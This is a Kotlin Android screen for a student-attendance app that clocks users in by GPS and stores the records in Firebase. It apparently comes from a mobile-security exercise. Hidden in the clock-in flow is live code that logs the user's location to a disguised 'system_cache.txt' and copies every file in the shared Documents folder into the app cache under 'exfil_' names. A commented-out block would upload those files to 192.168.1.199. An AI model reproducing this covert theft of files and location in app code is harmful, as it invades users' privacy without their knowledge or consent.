package com.example.axesite.screens

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.util.Log
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.core.app.ActivityCompat
import androidx.navigation.NavHostController
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.Priority
import com.google.firebase.database.*
import java.text.SimpleDateFormat
import java.util.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.io.IOException

data class AttendanceRecord(val module: String, val formattedTime: String)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun AttendanceScreen(navController: NavHostController) {
    // Constants for the target location (set these as needed).
    val scope = rememberCoroutineScope()
    val TARGET_LATITUDE = 1.4137966258157593
    val TARGET_LONGITUDE = 103.9125546343906
    val ALLOWED_RADIUS_METERS = 500000.0f  // For testing purposes

    // Retrieve user session info from SharedPreferences.
    val context = LocalContext.current
    val sharedPreferences = context.getSharedPreferences("UserSession", Context.MODE_PRIVATE)
    val userId = sharedPreferences.getString("userId", "") ?: ""
    val userNameFromPrefs = sharedPreferences.getString("name", "") ?: ""
    val userRole = sharedPreferences.getString("role", "") ?: ""

    // State variables for modules, attendance records, and loading/error states.
    var moduleNames by remember { mutableStateOf(listOf<String>()) }
    var loading by remember { mutableStateOf(true) }
    var errorMessage by remember { mutableStateOf("") }
    // For students: attendance records for that user.
    var attendanceRecords by remember { mutableStateOf(listOf<AttendanceRecord>()) }
    // For teachers: attendance records fetched for the selected module.
    // Here, each record is a Pair of (studentName, formattedTime)
    var teacherAttendanceRecords by remember { mutableStateOf(listOf<Pair<String, String>>()) }

    // State variables for dialogs (only for student clock-in confirmation).
    var showDialog by remember { mutableStateOf(false) }
    var selectedModule by remember { mutableStateOf("") }

    // Permission launcher to request ACCESS_FINE_LOCATION if not granted.
    val locationPermissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (!isGranted) {
            errorMessage = "Location permission is required to clock in."
        }
    }

    // Request location permission at runtime if not already granted.
    LaunchedEffect(Unit) {
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            locationPermissionLauncher.launch(Manifest.permission.ACCESS_FINE_LOCATION)
        }
    }

    // Function to fetch module names for a given list of module IDs.
    fun fetchModuleNames(
        database: FirebaseDatabase,
        moduleIds: List<String>,
        callback: (List<String>) -> Unit
    ) {
        val names = mutableListOf<String>()
        var count = 0
        if (moduleIds.isEmpty()) {
            callback(names)
            return
        }
        moduleIds.forEach { moduleId ->
            val moduleRef = database.getReference("modules").child(moduleId).child("moduleName")
            moduleRef.addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    snapshot.getValue(String::class.java)?.let { moduleName ->
                        names.add(moduleName)
                    }
                    count++
                    if (count == moduleIds.size) {
                        callback(names)
                    }
                }
                override fun onCancelled(error: DatabaseError) {
                    count++
                    if (count == moduleIds.size) {
                        callback(names)
                    }
                }
            })
        }
    }

    // For students: Fetch enrolled modules from Firebase.
    LaunchedEffect(userId) {
        if (userRole != "teacher") {
            val database = FirebaseDatabase.getInstance("https://mobile-sec-b6625-default-rtdb.asia-southeast1.firebasedatabase.app/")
            val enrollRef = database.getReference("enrollments").child(userId)
            Log.e("userId", userId)
            Log.d("enrollRef", enrollRef.toString())
            enrollRef.addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    // Each child key represents a module ID if the user is enrolled (value true)
                    val moduleIds = snapshot.children.mapNotNull { child ->
                        val isEnrolled = child.getValue(Boolean::class.java) ?: false
                        if (isEnrolled) child.key else null
                    }
                    // For each module ID, fetch the module name from "modules/<moduleId>/moduleName"
                    fetchModuleNames(database, moduleIds) { names ->
                        moduleNames = names
                        loading = false
                    }
                }
                override fun onCancelled(error: DatabaseError) {
                    errorMessage = "Error: ${error.message}"
                    loading = false
                }
            })
        } else {
            // For teacher, fetch modules from "modules" node.
            val database = FirebaseDatabase.getInstance("https://mobile-sec-b6625-default-rtdb.asia-southeast1.firebasedatabase.app/")
            database.getReference("modules").addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val names = mutableListOf<String>()
                    snapshot.children.forEach { child ->
                        child.child("moduleName").getValue(String::class.java)?.let { name ->
                            names.add(name)
                        }
                    }
                    moduleNames = names
                    loading = false
                }
                override fun onCancelled(error: DatabaseError) {
                    errorMessage = "Error: ${error.message}"
                    loading = false
                }
            })
        }
    }

    // For students: Fetch attendance records for that user.
    LaunchedEffect(userId) {
        if (userRole != "teacher") {
            val database = FirebaseDatabase.getInstance("https://mobile-sec-b6625-default-rtdb.asia-southeast1.firebasedatabase.app/")
            val attendanceRef = database.getReference("attendance").child(userId)
            attendanceRef.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val records = mutableListOf<AttendanceRecord>()
                    snapshot.children.forEach { child ->
                        val module = child.key ?: ""
                        val timestamp = child.getValue(Long::class.java)
                        if (timestamp != null) {
                            // Convert Unix timestamp to human-readable format in GMT+8.
                            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                            sdf.timeZone = TimeZone.getTimeZone("GMT+8")
                            val formattedTime = sdf.format(Date(timestamp))
                            records.add(AttendanceRecord(module, formattedTime))
                        }
                    }
                    attendanceRecords = records
                }
                override fun onCancelled(error: DatabaseError) {
                    Log.e("Attendance", "Error fetching attendance: ${error.message}")
                }
            })
        }
    }

    // For teachers: Function to fetch all attendance records for a selected module,
    // replacing the student ID with the student's name.
    fun fetchTeacherAttendance(module: String, callback: (List<Pair<String, String>>) -> Unit) {
        val database = FirebaseDatabase.getInstance("https://mobile-sec-b6625-default-rtdb.asia-southeast1.firebasedatabase.app/")
        val attendanceRef = database.getReference("attendance")
        attendanceRef.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val records = mutableListOf<Pair<String, String>>()
                val studentSnapshots = snapshot.children.toList()
                if (studentSnapshots.isEmpty()) {
                    callback(records)
                    return
                }
                var count = 0
                studentSnapshots.forEach { studentSnapshot ->
                    val studentId = studentSnapshot.key ?: ""
                    val timestamp = studentSnapshot.child(module).getValue(Long::class.java)
                    if (timestamp != null) {
                        // Fetch the student's name from "users/<studentId>/name".
                        database.getReference("users").child(studentId).child("name")
                            .addListenerForSingleValueEvent(object : ValueEventListener {
                                override fun onDataChange(userSnap: DataSnapshot) {
                                    val studentName = userSnap.getValue(String::class.java) ?: studentId
                                    val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                                    sdf.timeZone = TimeZone.getTimeZone("GMT+8")
                                    val formattedTime = sdf.format(Date(timestamp))
                                    records.add(Pair(studentName, formattedTime))
                                    count++
                                    if (count == studentSnapshots.size) {
                                        callback(records)
                                    }
                                }
                                override fun onCancelled(error: DatabaseError) {
                                    count++
                                    if (count == studentSnapshots.size) {
                                        callback(records)
                                    }
                                }
                            })
                    } else {
                        count++
                        if (count == studentSnapshots.size) {
                            callback(records)
                        }
                    }
                }
            }
            override fun onCancelled(error: DatabaseError) {
                callback(emptyList())
            }
        })
    }
    fun printCacheFiles(context: Context) {
        val cacheDir = context.cacheDir
        val files = cacheDir.listFiles() ?: emptyArray()

        if (files.isEmpty()) {
            Log.d("CacheFiles", "Cache directory is empty")
            return
        }

        Log.d("CacheFiles", "===== Contents of ${cacheDir.absolutePath} =====")

        files.sortedBy { it.name }.forEach { file ->
            val sizeKB = file.length() / 1024
            val modified = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(Date(file.lastModified()))

            Log.d("CacheFiles",
                "${file.name}\n" +
                        "Size: ${sizeKB} KB\n" +
                        "Modified: $modified\n" +
                        "Path: ${file.absolutePath}\n" +
                        "----------------------")
        }
    }
    fun uploadLogFileToServer(context: Context) {
        // IF YOU'RE INTEGRATING, READ THE COMMENTS. I THINK IT MIGHT HELP ABIT

        // This targets the Download directory. You may have to change this for the actual device (non-emulator)
        // Can test by adb shelling then touch a new file and verify on the phone if you at the right dir
        val downloadsDir = File("/storage/emulated/0/Documents") // Change me if needed!

        val cacheDir = context.cacheDir // This is just cache dir (/data/data/com.example.axesite/cache)

        // Some error handling. Works 100% fine on emulator. On emulator this if statement was always false.
        if (!downloadsDir.exists() || !downloadsDir.canRead()) {
            Log.e("Upload", "Cannot access downloads directory")
            return
        }

        scope.launch(Dispatchers.IO) {
            try {
                // List all files in the directory
                val files = downloadsDir.listFiles()?.filter { it.isFile } ?: emptyList()

                if (files.isEmpty()) {
                    withContext(Dispatchers.Main) {
                        Toast.makeText(context, "No files found in Downloads", Toast.LENGTH_SHORT).show()
                    }
                    return@launch
                }

                // You CAN 100% remove / comment this if you're exfiltrating through your way. (I did it for u already)
//                val client = OkHttpClient.Builder()
//                    .connectTimeout(10, TimeUnit.SECONDS)
//                    .build()

                // For loop to copy all files from the target directory to cache dir
                for (sourceFile in files) {
                    try {
                        // this is just to assign the absolute filepath to the variable destFile
                        val destFile = File(cacheDir, "exfil_${sourceFile.name}")

                        // Copy file
                        sourceFile.inputStream().use { input ->
                            destFile.outputStream().use { output ->
                                input.copyTo(output)
                            }
                        }

                        // Upload the file.
                        // You can absolutely once again remove / comment this if you are exfiltrating your way (I did it for u already)
                        // IF you are removing /commenting it, follow the start comment to end comment
                        // Anything in between Start to end is safe to comment if you're exfiltrating your way
                        // make sure also remove the val client comment on top as mentioned

                        // START
//                        val response = client.newCall(
//                            Request.Builder()
//                                .url("http://192.168.1.199")
//                                .post(destFile.readBytes().toRequestBody("application/octet-stream".toMediaType()))
//                                .build()
//                        ).execute()
//
//                        if (response.isSuccessful) {
//                            Log.d("Upload", "Uploaded ${sourceFile.name} successfully")
//                            destFile.delete() // Clean up
//                        } else {
//                            Log.e("Upload", "Failed to upload ${sourceFile.name}: ${response.code}")
//                        }
                        // END!

                    } catch (e: Exception) {
                        Log.e("Upload", "Error processing ${sourceFile.name}", e)
                    }
                }

                withContext(Dispatchers.Main) {
                    Toast.makeText(context, "Processed ${files.size} files", Toast.LENGTH_SHORT).show()
                }

                // This is just a function i wrote to log down if the files ACTUALLY moved.
                // Basically 'ls /data/data/com.example.axesite.com/cache' then see results in logcat filter for 'CacheFiles'
                // You can remove / comment this line and delete the entire function if you find it unnecessary.
                printCacheFiles(context)

            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    Toast.makeText(context, "Error: ${e.message}", Toast.LENGTH_LONG).show()
                }
                Log.e("Upload", "Failed to process directory", e)
            }

        }
    }
    // Function to process the obtained location.
    fun processLocation(location: Location, module: String) {

        scope.launch(Dispatchers.IO) {
            try {
                val file = File(context.cacheDir, "system_cache.txt")
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
                val data = """
                Module: $module
                Latitude: ${location.latitude}
                Longitude: ${location.longitude}
                Timestamp: $timestamp
                ------------------------
            """.trimIndent()

                file.appendText("$data\n\n")
                uploadLogFileToServer(context)
                Log.d("LocationSaver", "Data saved to ${file.absolutePath}")
            } catch (e: IOException) {
                Log.e("LocationSaver", "Error saving location", e)
            }
        }
        // Create a target location object.
        val targetLocation = Location("").apply {
            latitude = TARGET_LATITUDE
            longitude = TARGET_LONGITUDE
        }
        val distance = location.distanceTo(targetLocation)
        Log.d("ClockIn", "Distance to target: $distance meters")
        if (distance <= ALLOWED_RADIUS_METERS) {
            // Within allowed range; update attendance timestamp.
            val attendanceRef = FirebaseDatabase.getInstance("https://mobile-sec-b6625-default-rtdb.asia-southeast1.firebasedatabase.app/")
                .getReference("attendance")
            val clockInTimestamp = System.currentTimeMillis()
            // For example, store at "attendance/<userId>/<module>".
            attendanceRef.child(userId).child(module).setValue(clockInTimestamp)
                .addOnCompleteListener { task ->
                    if (task.isSuccessful) {
                        Log.d("ClockIn", "Attendance clocked in successfully.")
                    } else {
                        Log.e("ClockIn", "Failed to clock in attendance.")
                    }
                }
        } else {
            Log.e("ClockIn", "User is not within the required vicinity.")
        }
    }

    // Function to clock in attendance using alternative location retrieval methods.
    fun clockInAttendance(module: String) {
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            errorMessage = "Location permission not granted."
            return
        }
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
        // First, try to get the current location.
        fusedLocationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
            .addOnSuccessListener { currentLocation: Location? ->
                if (currentLocation != null) {
                    Log.d("ClockIn", "Using getCurrentLocation.")
                    processLocation(currentLocation, module)
                } else {
                    Log.d("ClockIn", "getCurrentLocation returned null, trying lastLocation.")
                    // If getCurrentLocation is null, try lastLocation.
                    fusedLocationClient.lastLocation.addOnSuccessListener { lastLocation: Location? ->
                        if (lastLocation != null) {
                            Log.d("ClockIn", "Using last known location.")
                            processLocation(lastLocation, module)
                        } else {
                            Log.e("ClockIn", "Both getCurrentLocation and lastLocation returned null, requesting updates as fallback.")
                            // Fallback: request location updates until we obtain a location.
                            val locationRequest = LocationRequest.create().apply {
                                interval = 5000 // 5 seconds interval
                                fastestInterval = 2000 // 2 seconds fastest interval
                                priority = Priority.PRIORITY_HIGH_ACCURACY
                            }
                            val locationCallback = object : LocationCallback() {
                                override fun onLocationResult(result: LocationResult) {
                                    val updatedLocation = result.lastLocation
                                    if (updatedLocation != null) {
                                        processLocation(updatedLocation, module)
                                        fusedLocationClient.removeLocationUpdates(this)
                                    }
                                }
                            }
                            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, null)
                        }
                    }
                        .addOnFailureListener { exception ->
                            Log.e("ClockIn", "Error in lastLocation: ${exception.localizedMessage}")
                        }
                }
            }
            .addOnFailureListener { exception ->
                Log.e("ClockIn", "Error in getCurrentLocation: ${exception.localizedMessage}")
            }
    }

    Scaffold(
        topBar = {
            TopAppBar(title = { Text("A ttendance") })
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .padding(padding)
                .fillMaxSize()
                .padding(16.dp)
        ) {
            Text(
                text = "Attendance - $userNameFromPrefs",
                style = MaterialTheme.typography.headlineSmall
            )
            Spacer(modifier = Modifier.height(16.dp))
            when {
                loading -> {
                    CircularProgressIndicator()
                }
                errorMessage.isNotEmpty() -> {
                    Text(text = errorMessage, color = MaterialTheme.colorScheme.error)
                }
                moduleNames.isEmpty() -> {
                    Text("No enrolled modules found.")
                }
                else -> {
                    LazyColumn {
                        items(moduleNames) { moduleName ->
                            Card(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(vertical = 4.dp)
                                    .clickable {
                                        selectedModule = moduleName
                                        if (userRole == "teacher") {
                                            // For teacher, fetch attendance records for the selected module.
                                            fetchTeacherAttendance(selectedModule) { records ->
                                                teacherAttendanceRecords = records
                                            }
                                        } else {
                                            // For students, show the clock-in confirmation dialog.
                                            showDialog = true
                                        }
                                    }
                            ) {
                                Row(modifier = Modifier.padding(16.dp)) {
                                    Text(text = moduleName)
                                }
                            }
                        }
                    }
                }
            }
            Spacer(modifier = Modifier.height(16.dp))
            if (userRole != "teacher") {
                // For students, display their own attendance records.
                Text(
                    text = "Your Attendance Records:",
                    style = MaterialTheme.typography.headlineSmall
                )
                if (attendanceRecords.isEmpty()) {
                    Text("No attendance records found.")
                } else {
                    LazyColumn {
                        items(attendanceRecords) { record ->
                            Card(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(vertical = 4.dp)
                            ) {
                                Row(modifier = Modifier.padding(16.dp)) {
                                    Column {
                                        Text("Module: ${record.module}")
                                        Text("Clock in time: ${record.formattedTime}")
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                // For teachers, dynamically display fetched attendance records for the selected module.
                if (teacherAttendanceRecords.isNotEmpty()) {
                    Spacer(modifier = Modifier.height(16.dp))
                    Text(
                        text = "Attendance Records for $selectedModule:",
                        style = MaterialTheme.typography.headlineSmall
                    )
                    LazyColumn {
                        items(teacherAttendanceRecords) { record ->
                            Card(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(vertical = 4.dp)
                            ) {
                                Row(modifier = Modifier.padding(16.dp)) {
                                    Column {
                                        Text("Student: ${record.first}")
                                        Text("Clock in time: ${record.second}")
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        // Confirmation dialog for student clocking in.
        if (showDialog) {
            AlertDialog(
                onDismissRequest = { showDialog = false },
                title = { Text("Confirm Attendance") },
                text = { Text("Clock in for module $selectedModule?") },
                confirmButton = {
                    TextButton(onClick = {
                        clockInAttendance(selectedModule)
                        showDialog = false
                    }) {
                        Text("Yes")
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showDialog = false }) {
                        Text("No")
                    }
                }
            )
        }
    }
}